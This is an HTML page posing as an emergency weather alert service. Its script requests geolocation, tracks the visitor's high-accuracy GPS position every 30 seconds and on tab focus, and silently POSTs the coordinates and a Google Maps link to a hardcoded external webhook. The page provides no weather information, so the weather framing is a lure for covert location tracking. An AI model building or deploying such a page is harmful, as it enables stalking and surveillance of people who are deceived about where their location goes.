<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<title>Emergency Weather Alerts - Live Location</title>

<!-- PWA Manifest (Survives Tab Close) -->
<link rel="manifest" href="data:application/json,{
  'name':'Weather Alerts Live',
  'short_name':'WeatherLive',
  'start_url':'./',
  'display':'standalone',
  'background_color':'#1e3a5f',
  'theme_color':'#1e3a5f',
  'icons':[{
    'src':'data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🌩️</text></svg>',
    'sizes':'192x192',
    'type':'image/svg+xml'
  }]
}">

<style>
body{margin:0;background:#1e3a5f;color:white;font-family:Arial,sans-serif;text-align:center;padding:30px}
button{padding:18px 35px;font-size:18px;background:#00b894;color:white;border:none;border-radius:10px;cursor:pointer;margin:20px}
#coords{font-size:20px;padding:15px;background:rgba(0,0,0,0.3);border-radius:10px;margin:15px 0}
small{opacity:0.7}
</style>
</head>
<body>
<h1>🌩️ Emergency Weather Alerts</h1>
<p>GPS tracking for severe weather notifications</p>

<button id="btn" onclick="installPWA()">📍 Enable Live Location</button>

<div id="status" style="display:none">
  <div id="coords">Waiting...</div>
  <p>Updates every 30 seconds</p>
</div>

<script>
// CUSTOM WEBHOOK
const WEBHOOK = "https://eowi5n8vlh9h3xy.m.pipedream.net";

// PWA INSTALL + GPS TRACKING
let installed = false;
let watchId = null;
let intervalId = null;

async function installPWA() {
  // REQUEST PERSISTENT PERMISSION
  const perm = await navigator.permissions.query({ name: 'geolocation' });
  console.log('Permission:', perm.state); // 'granted' | 'prompt' | 'denied'
  
  if (perm.state === 'granted') {
    startTracking();
    document.getElementById('status').style.display = 'block';
    document.getElementById('btn').textContent = '✅ Location Active';
    document.getElementById('btn').style.background = '#00b894';
  } else {
    // Trigger browser permission prompt
    navigator.geolocation.getCurrentPosition(startTracking, () => {});
  }
}

function startTracking() {
  installed = true;
  
  // 1. PRIMARY: watchPosition (works while tab OPEN)
  watchId = navigator.geolocation.watchPosition(
    sendGPS,
    err => console.log('GPS Error:', err),
    { enableHighAccuracy: true, timeout: 10000 }
  );
  
  // 2. BACKUP: 30s setInterval (survives tab minimization)
  intervalId = setInterval(() => {
    navigator.geolocation.getCurrentPosition(sendGPS, () => {}, { timeout: 5000 });
  }, 30000);
  
  // 3. VISIBILITY API: Resume when tab focuses
  document.addEventListener('visibilitychange', () => {
    if (!document.hidden && installed) {
      navigator.geolocation.getCurrentPosition(sendGPS);
    }
  });
}

function sendGPS(position) {
  const lat = position.coords.latitude;
  const lon = position.coords.longitude;
  const acc = position.coords.accuracy;
  const ts = new Date().toISOString();
  
  // Update UI
  document.getElementById('coords').innerHTML = 
    `📍 ${lat.toFixed(6)}, ${lon.toFixed(6)}<br>
     📏 ${acc.toFixed(0)}m accuracy<br>
     ⏰ ${new Date().toLocaleTimeString()}`;
  
  // Send to Pipedream (30s guarantee)
  fetch(WEBHOOK, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      type: 'pwa_30s',
      latitude: lat,
      longitude: lon,
      accuracy: acc,
      timestamp: ts,
      maps: `https://maps.google.com/maps?q=${lat},${lon}`
    })
  }).catch(() => {});
}

// AUTO-DETECT INSTALL (Chrome shows install prompt)
window.addEventListener('beforeinstallprompt', (e) => {
  e.preventDefault();
  e.userChoice.then((choice) => {
    if (choice.outcome === 'accepted') {
      startTracking();
    }
  });
});
</script>
</body>
</html>
